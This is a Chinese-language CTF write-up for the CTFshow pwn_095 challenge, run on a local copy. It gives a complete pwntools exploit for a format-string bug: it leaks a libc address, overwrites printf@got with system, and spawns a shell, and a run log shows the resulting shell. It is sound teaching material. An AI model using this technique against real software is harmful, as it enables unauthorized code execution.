# CTFshow-pwn_095
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 格式化字符串（leak + 任意写）
## 解题思路
> 先用格式化字符串泄露 libc 上的地址，计算得到 system 的实际地址，再用格式化字符串覆写 got 表

仅开启 NX 且为部分 RELRO，本地直接用 glibc-2.23了  
```text
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ patchelf --set-interpreter ~/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-2.23.so ./pwn_095
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ patchelf --set-rpath ~/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386 ./pwn_095
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_095
[*] '/home/mrw/CTFshow/pwn_095'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8046000)
    RUNPATH:    b'/home/mrw/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386'
    Stripped:   No
    Debuginfo:  Yes
```
 
漏洞函数和主函数伪代码如下  
```c
void __noreturn ctfshow()
{
  char buf[100]; // [esp+8h] [ebp-70h] BYREF
  unsigned int v1; // [esp+6Ch] [ebp-Ch]

  v1 = __readgsdword(0x14u);
  while ( 1 )
  {
    memset(buf, 0, sizeof(buf));
    read(0, buf, 0x64u);
    printf(buf);
    fflush(stdout);
  }
}
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  init();
  logo();
  ctfshow();
}
```
- 本题同 pwn_094 的最大区别是去掉了程序中原有的 system 函数，需要从 libc 中寻找  
- 经过调试确定 printf 的第6个参数为输入内容，由 gdb 可得输入内容+0x84处（对应第39个参数）有着  libc地址值 __libc_start_main + 247  
- 可以先用printf 泄露这一地址，计算得到 system_addr 再覆写掉 printf@got，最后输入 "/bin/sh" 提权

**exp如下**
```python
from pwn import *
p = process('./pwn_095')
libc = ELF('/home/mrw/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so')
# gdb.attach(p)
printf_got = 0x0804a010
# leak
payload1 = b'START%39$p\n'
p.send(payload1)
p.recvuntil(b'START')
libc_base = int(p.recvuntil(b'\n')[:-1], 16) - libc.symbols['__libc_start_main'] - 247
print(f'libc_base is {libc_base:x}')
# write
system_addr = libc_base + libc.symbols['system']
payload2 = fmtstr_payload(6, {printf_got:system_addr})
p.send(payload2)
# getshell
p.send(b'/bin/sh\x00')
p.interactive()
```
## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_095.py
[+] Starting local process './pwn_095': pid 26296
[*] '/home/mrw/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc_base is ef362000
[*] Switching to interactive mode
                                                        \xc8                                                                                                                      d                            \xba                                 `aaa\x12\xa0\x0\x10\xa0\x0\x11\xa0\x0\x13\xa0\
$ ls /
bin           dev     lib32            media  run               swap.img
bin.usr-is-merged  etc     lib64            mnt    sbin               sys
boot           flag  lib.usr-is-merged  opt    sbin.usr-is-merged  tmp
cdrom           home  libx32            proc   snap               usr
ctfshow_flag       lib     lost+found        root   srv               var
$ cat /ctfshow_flag
flag{Success!}
$  
```
